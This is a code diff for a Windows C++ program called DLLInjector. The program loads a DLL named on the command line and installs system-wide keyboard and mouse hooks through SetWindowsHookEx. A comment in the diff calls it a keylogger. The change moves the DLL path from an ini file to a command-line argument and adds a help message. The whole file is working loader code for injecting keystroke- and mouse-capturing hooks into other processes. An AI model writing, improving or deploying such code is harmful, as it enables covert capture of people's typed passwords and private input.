@@ -1,31 +1,30 @@
-#include <iostream>
 #include <windows.h>
-#include <stdio.h>
+
+#include <iostream>
+#include <tchar.h> // using _tmain macro
+#include <conio.h> // using _getch
+
+// Used for x86 and x64 compatibility
+#ifdef UNICODE
+#define tcout std::wcout
+#else
+#define tcout std::cout
+#endif
+
+// CLI help message
+void displayHelp() {
+    tcout
+        << TEXT("Usage: ./DLLInjector.exe <dll_path>\n")
+        << TEXT("\nArguments:\n")
+        << TEXT("  <dll_path>:      Path to the .dll file with the procedures.\n")
+        << std::endl;
+}
 
 HHOOK hookKeyboard;
 HHOOK hookMouse;
 
-// function to read the conf.ini file to determine the path to the DLL
-wchar_t* ReadINI(LPCWSTR szSection, LPCWSTR szKey, LPCWSTR szDefaultValue)
+void WINAPI installGlobalHooks(HMODULE lib)
 {
-    wchar_t* szResult = new wchar_t[255];
-    memset(szResult, 0x00, 255);
-    GetPrivateProfileString(szSection, szKey,
-        szDefaultValue, szResult, 255, L".\\conf.ini");
-    return szResult;
-}
-
-void WINAPI installGlobalHooks()
-{
-    //lets load the dll and install the global hook
-    LPCWSTR dllPath = ReadINI(L"CONFIGURATION", L"DLL_PATH", L"none");
-    HMODULE lib = LoadLibrary(dllPath);
-
-    if (lib == NULL) {
-        printf("Can't find dll!\n");
-        return;
-    }
-
     // GetProcAddress is used with the Name-decoration convention (__stdcall calling convention is used to call Win32 API functions): 
     // An underscore (_) is prefixed to the name and the name is followed by the at sign (@) followed by the number of bytes (in decimal) in the argument list.
 #ifdef _WIN64
@@ -37,30 +36,54 @@ void WINAPI installGlobalHooks()
 #endif
 
     if (procedureKeyboard == NULL) {
-        printf("Can't find Keyboard function in dll!\n");
+        tcout << "Can't find Keyboard function in dll!" << std::endl;
         return;
     }
 
     if (procedureMouse == NULL) {
-        printf("Can't find Mouse function in dll!\n");
+        tcout << "Can't find Mouse function in dll!" << std::endl;
         return;
     }
 
     // install hook keyboard
     hookKeyboard = SetWindowsHookEx(WH_KEYBOARD, procedureKeyboard, lib, 0);
     if (hookKeyboard == NULL) {
-        printf("Keyboard hook failed to install!\n");
+        tcout << "Keyboard hook failed to install!" << std::endl;
         return;
     }
 
     // install hook mouse
     hookMouse = SetWindowsHookEx(WH_MOUSE, procedureMouse, lib, 0);
     if (hookMouse == NULL) {
-        printf("Mouse hook failed to install!\n");
+        tcout << "Mouse hook failed to install!" << std::endl;
         return;
     }
 
-    printf("Hooks installed properly!\n\n");
+    tcout << "Hooks installed properly!" << std::endl;
+}
+
+int _tmain(int argc, TCHAR* argv[])
+{
+    if (argc != 2) {
+        displayHelp();
+        return 1;
+    } else if (argv[1] == TEXT("--help")){
+        displayHelp();
+        return 0;
+    }
+
+    // Find the DLL with the procedures
+    HMODULE lib = LoadLibrary(argv[1]);
+
+    if (lib == NULL) {
+        tcout << "Can't find dll!" << std::endl;
+        return 1;
+    }
+    
+
+    // Install the procedures
+    installGlobalHooks(lib);
+
     MSG message;
     // GetMessage retrieves a message from the calling thread's message queue. 
     // The function dispatches incoming sent messages until a posted message is available for retrieval.
@@ -74,11 +97,15 @@ void WINAPI installGlobalHooks()
         DispatchMessage(&message);
     }
 
+    tcout << TEXT("Press 'Q' to quit") << std::endl;
+    int ch = ' ';
+    while (ch != 'Q') {
+        ch = _gettch();
+        ch = toupper(ch);
+    }
+
+    // Stop the keylogger
     FreeLibrary(lib);
     UnhookWindowsHookEx(hookKeyboard);
     UnhookWindowsHookEx(hookMouse);
-}
-
-int main() {
-    installGlobalHooks();
 }
